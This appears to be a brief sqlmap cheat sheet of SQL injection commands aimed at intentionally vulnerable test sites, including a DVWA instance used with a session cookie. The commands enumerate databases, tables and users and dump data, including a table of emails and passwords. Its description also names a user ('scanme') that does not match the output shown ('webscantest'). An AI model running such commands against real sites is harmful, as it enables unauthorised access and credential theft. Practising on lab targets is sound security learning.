# Usage
http://www.webscantest.com/

# Determine the DBMS Behind the Web Site
./sqlmap.py -u "http://www.webscantest.com/datastore/search_get_by_id.php?id=4"
./sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1
# Find the Databases
./sqlmap.py -u "http://www.webscantest.com/datastore/search_get_by_id.php?id=4" --dbs
./sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
# Get More Info from the Database
./sqlmap.py -u "http://www.webscantest.com/datastore/search_get_by_id.php?id=4" --tables
./sqlmap.py -u "http://www.webscantest.com/datastore/search_get_by_id.php?id=4" --dbs --columns -D webscantest

./sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
./sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables --columns
# Enumerate the Database Users
./sqlmap.py -u "http://webscantest.com/datastore/search_get_by_id.php?id=4" --users
./sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns

**Output: &&
database management system users [1]:
[*] 'webscantest'@'%'

**Description:* In this case, the user "scanme" can login from any host or IP, as the database admin has used the wildcard "%" which means "any or none".

# Extract the Data
./sqlmap.py -u "http://www.webscantest.com/datastore/search_get_by_id.php?id=4" --dump -D webscantest -T orders
./sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dump -D acuart -T users -C email,name,pass 

#DVWA Example: http://resources.infosecinstitute.com/sql-injection/

1. Get cookie
2. ./sqlmap.py -u "https://sqlmap-dungdt.c9users.io/DVWA-1.9/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=arkk9hvnd6hi86uefdv1vrsts0; security=low"